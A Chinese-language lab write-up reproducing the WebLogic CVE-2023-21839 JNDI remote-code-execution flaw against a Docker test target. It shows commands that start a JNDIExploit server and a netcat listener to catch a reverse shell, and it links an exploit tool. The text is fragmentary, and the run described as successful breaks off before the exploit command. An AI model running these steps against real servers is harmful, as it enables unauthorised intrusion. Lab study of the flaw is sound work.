# 2\. 漏洞复现

### 2.1 漏洞原理

CVE-2023-21839允许远程用户在未经授权的情况下通过 `IIOP/T3` 进行 `JNDI lookup` 操作，当 `JDK` 版本过低或本地存在小工具（javaSerializedData）时，这可能会导致`RCE`漏洞。

以上来源于：

```
https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2023-21839/README.zh-cn.md
```

### 2.3 漏洞复现1-失败

攻击机`kali` ： `192.168.135.22`（`java11`）  
目标机：`10.30.0.214`（`mac`启动的`docker`，`java8`）  
中转文件：`JNDIExploit-1.4-SNAPSHOT.jar`  
在`kali`上同时启动监听、命令执行、反弹`shell`的工作，先监听：

```
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 10.30.0.214
```

![](../Images/bfcdc90bb824557021baecac8d70867c.png "null")

image.png

然后在本地开启监听：

```
nc -lvnp 7777
```

![](../Images/29f559e7a8a0e54bc94634627e243aaf.png "null")

image.png

使用下面的工具进行测试：

```
https://github.com/DXask88MA/Weblogic-CVE-2023-21839
```

命令（要记得使用`java8`的环境，不然会报错）：

```

### 2.4 漏洞复现2-成功

攻击机`kali` ： `192.168.135.22`（`java11`）  
目标机：`10.30.0.214`（`mac`启动的`docker`，`java8`）  
中转文件：`JNDIExploit-1.4-SNAPSHOT.jar`  
首先在kali上设置监听，用于接收反弹的`shell`：

![](../Images/db714721b9a763bf4fee8b2f238bf697.png "null")

image.png

再通过`kali`上来设置监听：

```
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.135.22
```

![](../Images/4b2cce2658df2f13dc7a08350cbd3287.png "null")

image.png

```
